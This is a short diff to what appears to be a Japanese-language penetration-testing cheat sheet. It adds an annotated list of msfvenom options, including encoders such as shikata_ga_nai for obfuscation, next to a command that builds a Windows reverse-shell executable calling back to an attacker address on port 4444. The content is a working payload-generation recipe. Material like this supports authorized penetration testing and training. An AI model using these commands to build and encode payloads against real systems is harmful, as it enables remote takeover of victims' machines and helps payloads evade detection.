@@ -690,6 +690,14 @@ lient.Close()"
 ```
 
 ## msfvenom
+- -p...使用するpayloadの指定
+- -f...出力フォーマット
+- -a...使用するアーキテクチャ
+- -e...エンコーディングの指定(x86/shikata_ga_nai，x64/zutto_dekiru)
+- -i...エンコードする回数
+- --platform...プラットフォームの選択(windows，Linux)
+- -o...ファイルの出力
+  
 Windows
 ```
 msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > reverse.exe
